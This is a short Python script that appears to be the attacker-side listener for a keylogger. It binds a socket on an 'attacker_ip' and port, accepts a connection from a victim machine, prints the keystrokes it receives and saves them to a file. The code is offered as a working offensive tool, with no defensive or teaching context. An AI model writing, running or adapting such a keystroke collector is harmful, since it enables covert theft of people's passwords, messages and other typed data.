import socket
import os
import platform
import datetime
def clearing():
    if platform.system() == 'Linux':
        os.system('clear')
    else:
        os.system('cls')

attacker_ip = input('[*]IP:')
attacker_port = int(input('[*]PORT:'))

clearing()

print(''' __       __       _______.___________. _______ .__   __.  _______ .______      
|  |     |  |     /       |           ||   ____||  \ |  | |   ____||   _  \     
|  |     |  |    |   (----`---|  |----`|  |__   |   \|  | |  |__   |  |_)  |    
|  |     |  |     \   \       |  |     |   __|  |  . `  | |   __|  |      /     
|  `----.|  | .----)   |      |  |     |  |____ |  |\   | |  |____ |  |\  \----.
|_______||__| |_______/       |__|     |_______||__| \__| |_______|| _| `._____|
                                                                                ''') 


s = socket.socket()
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((attacker_ip,attacker_port))
s.listen(1)
print(f'[*]Listener is up on - {attacker_ip}:{attacker_port}')
sex1,sex2 = s.accept()
print(f'[*]connection recived from-"{sex2[0]}"')

logged_keys = []
try:
    while 1:
        keystroke = sex1.recv(1024).decode('utf-8')
        if len(keystroke) != 0:
            logged_keys.append(keystroke)
        print(keystroke)
except:
    prompt = input('[*]an error occured do you want to save the keystrokes logged till now in a file? y/N\n:')
    if prompt == 'y' or 'Y':
        file_name = input("enter the name of the file\n:")

        
        with open(file_name,'w') as file:
            for word in logged_keys:
                file.write(f'{word}\n')


